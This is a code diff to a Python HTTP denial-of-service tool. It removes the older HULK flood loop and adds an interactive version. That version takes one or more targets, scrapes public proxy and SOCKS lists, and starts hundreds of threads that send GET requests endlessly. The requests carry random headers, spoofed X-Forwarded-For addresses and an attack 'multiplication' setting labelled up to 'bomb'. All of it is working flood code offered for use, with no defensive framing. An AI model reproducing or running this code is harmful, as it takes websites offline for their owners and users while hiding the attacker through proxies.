@@ -3451,81 +3451,311 @@ print \
 """ 
 
 
-#http request
-def httpcall(url):
-	useragent_list()
-	referer_list()
-	code=0
-	if url.count("?")>0:
-		param_joiner="&"
-	else:
-		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', random.choice(headers_useragents))
-	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
-	request.add_header('Connection', 'keep-alive')
-	request.add_header('Host',host)
-	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
-			#print e.code
-			set_flag(1)
-			print 'Response Code 500'
-			code=500
-	except urllib2.URLError, e:
-			#print e.reason
-			sys.exit()
-	else:
-			inc_counter()
-			urllib2.urlopen(request)
-	return(code)		
+def starturl(): 
+	global url
+	global url2
+	global urlport
+	global choice1
+	global ips
 
-	
-#http caller thread 
-class HTTPThread(threading.Thread):
-	def run(self):
+	choice1 = input("\nDo you want one target [0] or more[1] > ")
+
+	if choice1 == "1":
+		ip_file = input("Insert txt file of ips > ")
+		ips = open(ip_file).readlines()
+
+
+
+	else:
+		url = input("\nInsert URL/IP: ").strip()
+
+		if url == "":
+			print ("Please enter the url.")
+			starturl()
+
 		try:
-			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
-					set_flag(2)
-		except Exception, ex:
-			pass
+			if url[0]+url[1]+url[2]+url[3] == "www.":
+				url = "http://" + url
+			elif url[0]+url[1]+url[2]+url[3] == "http":
+				pass
+			else:
+				url = "http://" + url
+		except:
+			print("You mistyped, try again.")
+			starturl()
 
-# monitors http threads and counts requests
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
-				previous=request_counter
-		if flag==2:
-			print "\n-- HULK Attack Finished --"
+		try:
+			url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+		except:
+			url2 = url.replace("http://", "").replace("https://", "").split("/")[0]
 
-#execute 
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
-else:
-	if sys.argv[1]=="help":
-		usage()
-		sys.exit()
+		try:
+			urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
+		except:
+			urlport = "80"
+
+	proxymode()
+
+
+def proxymode():
+	global choice2
+	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
+	if choice2 == "y":
+		choiceproxysocks()
 	else:
-		print "-- HULK Attack Started --"
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(500):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()
+		numthreads()
+
+def choiceproxysocks():
+	global choice3
+	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
+	if choice3 == "0":
+		choicedownproxy()
+	elif choice3 == "1":
+		choicedownsocks()
+	else:
+		print ("You mistyped, try again.")
+		choiceproxysocks()
+
+def choicedownproxy():
+	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
+	if choice4 == "y":
+		urlproxy = "http://free-proxy-list.net/"
+		proxyget(urlproxy)
+	else:
+		proxylist()
+
+def choicedownsocks():
+	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
+	if choice4 == "y":
+		urlproxy = "https://www.socks-proxy.net/"
+		proxyget(urlproxy)
+	else:
+		proxylist()
+
+def proxyget(urlproxy): 
+	try:
+		req = urllib.request.Request(("%s") % (urlproxy))       
+		req.add_header("User-Agent", random.choice(useragents))
+		sourcecode = urllib.request.urlopen(req)                
+		part = str(sourcecode.read())                          
+		part = part.split("<tbody>")
+		part = part[1].split("</tbody>")
+		part = part[0].split("<tr><td>")
+		proxies = ""
+		for proxy in part:
+			proxy = proxy.split("</td><td>")
+			try:
+				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
+			except:
+				pass
+		out_file = open("proxy.txt","w")
+		out_file.write("")
+		out_file.write(proxies)
+		out_file.close()
+		print ("Proxies downloaded successfully.")
+	except: 
+		print ("\nERROR!\n")
+	proxylist() 
+
+def proxylist():
+	global proxies
+	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
+	if out_file == "":
+		out_file = "proxy.txt"
+	proxies = open(out_file).readlines()
+	numthreads()
+
+def numthreads():
+	global threads
+	try:
+		threads = int(input("Insert number of threads (800): "))
+	except ValueError:
+		threads = 800
+		print ("800 threads selected.\n")
+	multiplication()
+
+def multiplication():
+	global multiple
+	try:
+		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
+	except ValueError:
+		print("You mistyped, try again.\n")
+		multiplication()
+	begin()
+
+def begin():
+	choice6 = input("Press 'Enter' to start attack: ")
+	if choice6 == "":
+		loop()
+	elif choice6 == "Enter": 
+		loop()
+	elif choice6 == "enter": 
+		loop()
+	else:
+		exit(0)
+
+def loop():
+	global threads
+	global acceptall
+	global connection
+	global go
+	global x
+	
+	acceptall = [
+	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
+	"Accept-Encoding: gzip, deflate\r\n", 
+	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
+	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+	"Accept: text/html, application/xhtml+xml",
+	"Accept-Language: en-US,en;q=0.5\r\n",
+	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+	] 
+	connection = "Connection: Keep-Alive\r\n" 
+	x = 0 
+	go = threading.Event()
+	if choice2 == "y": 
+		if choice3 == "0": 
+			for x in range(threads):
+				RequestProxyHTTP(x+1).start() 
+				print ("Thread " + str(x) + " ready!")
+			go.set() 
+		else: 
+			for x in range(threads):
+				RequestSocksHTTP(x+1).start() 
+				print ("Thread " + str(x) + " ready!")
+			go.set() 
+	else: 
+		for x in range(threads):
+			RequestDefaultHTTP(x+1).start() 
+			print ("Thread " + str(x) + " ready!")
+		go.set() 
+
+
+class RequestProxyHTTP(threading.Thread): 
+
+	def __init__(self, counter):
+		threading.Thread.__init__(self)
+		self.counter = counter
+
+	def run(self):
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
+		accept = random.choice(acceptall) 
+		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
+		forward = "X-Forwarded-For: " + randomip + "\r\n" 
+		if choice1 == "1":
+			ip = random.choice(ips)
+			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+		else:
+			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+		request = get_host + useragent + accept + forward + connection + "\r\n" 
+		current = x 
+		if current < len(proxies): 
+			proxy = proxies[current].strip().split(':')
+		else: 
+			proxy = random.choice(proxies).strip().split(":")
+		go.wait() 
+		while True: 
+			try:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+				s.connect((str(proxy[0]), int(proxy[1]))) 
+				s.send(str.encode(request)) 
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+				try: 
+					for y in range(multiple): 
+						s.send(str.encode(request))
+				except: 
+					s.close()
+			except:
+				s.close() 
+
+class RequestSocksHTTP(threading.Thread):
+
+	def __init__(self, counter): 
+		threading.Thread.__init__(self)
+		self.counter = counter
+
+	def run(self): 
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
+		accept = random.choice(acceptall) 
+		if choice1 == "1":
+			ip = random.choice(ips)
+			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+		else:
+			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+		request = get_host + useragent + accept + connection + "\r\n" 
+		current = x 
+		if current < len(proxies):
+			proxy = proxies[current].strip().split(':')
+		else: 
+			proxy = random.choice(proxies).strip().split(":")
+		go.wait() 
+		while True:
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+				s = socks.socksocket() 
+				s.connect((str(url2), int(urlport))) 
+				s.send (str.encode(request)) 
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+				try: 
+					for y in range(multiple): 
+						s.send(str.encode(request)) 
+				except: 
+					s.close()
+			except: 
+				s.close() 
+				try: 
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
+					s = socks.socksocket() 
+					s.connect((str(url2), int(urlport)))
+					s.send (str.encode(request))
+					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter)
+					try:
+						for y in range(multiple):
+							s.send(str.encode(request)) 
+					except:
+						s.close()
+				except:
+					print ("Sock down. Retrying request. @", self.counter)
+					s.close() 
+
+class RequestDefaultHTTP(threading.Thread): 
+
+	def __init__(self, counter):
+		threading.Thread.__init__(self)
+		self.counter = counter
+
+	def run(self): 
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
+		accept = random.choice(acceptall) 
+		if choice1 == "1":
+			ip = random.choice(ips)
+			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+		else:
+			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+		request = get_host + useragent + accept + connection + "\r\n" 
+		go.wait() 
+		while True:
+			try:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+				s.connect((str(url2), int(urlport)))
+				s.send (str.encode(request)) 
+				print ("Request sent! @", self.counter) 
+				try: 
+					for y in range(multiple): 
+						s.send(str.encode(request))
+				except: 
+					s.close()
+			except:
+				s.close() 
+
+
+if __name__ == '__main__':
+	starturl() 
